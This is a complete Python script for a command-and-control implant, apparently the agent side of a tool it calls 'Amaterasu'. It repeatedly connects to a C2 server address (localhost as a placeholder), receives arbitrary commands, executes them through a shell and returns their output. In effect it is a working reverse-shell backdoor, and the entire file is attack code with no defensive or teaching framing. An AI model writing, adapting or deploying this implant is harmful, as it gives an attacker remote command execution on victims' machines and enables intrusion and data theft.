import socket
import subprocess
import time


SERVER_IP = "127.0.0.1"   
SERVER_PORT = 5005
RETRY_DELAY = 3


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        print("[*] Connecting to C2...")
        sock.connect((SERVER_IP, SERVER_PORT))
        print("[+] Connected to Amaterasu")
        break
    except ConnectionRefusedError:
        print("[!] C2 not available, retrying...")
        time.sleep(RETRY_DELAY)


while True:
    try:
        command = sock.recv(4096).decode()

        if not command:
            break

        if command.lower() == "quit":
            break

        try:
            output = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                text=True
            )
        except subprocess.CalledProcessError as e:
            output = e.output

        if not output.strip():
            output = "[+] Command executed (no output)"

        sock.sendall(output.encode())

    except Exception as e:
        print(f"[-] Error: {e}")
        break

sock.close()
print("[-] Disconnected from C2")
